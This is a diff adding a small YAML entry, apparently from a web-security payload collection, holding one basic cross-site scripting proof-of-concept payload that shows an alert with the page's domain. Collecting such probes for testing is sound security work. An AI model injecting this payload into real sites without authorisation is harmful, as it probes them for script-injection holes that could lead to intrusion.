@@ -1,0 +1,8 @@
+metadata:
+  filename: "xss-script-basic-poc-alert.yaml"
+  tags: ["web"]
+  created: "2025-03-29"
+  author: "Unknown"
+
+content: |
+  <script>alert(document.domain)</script>
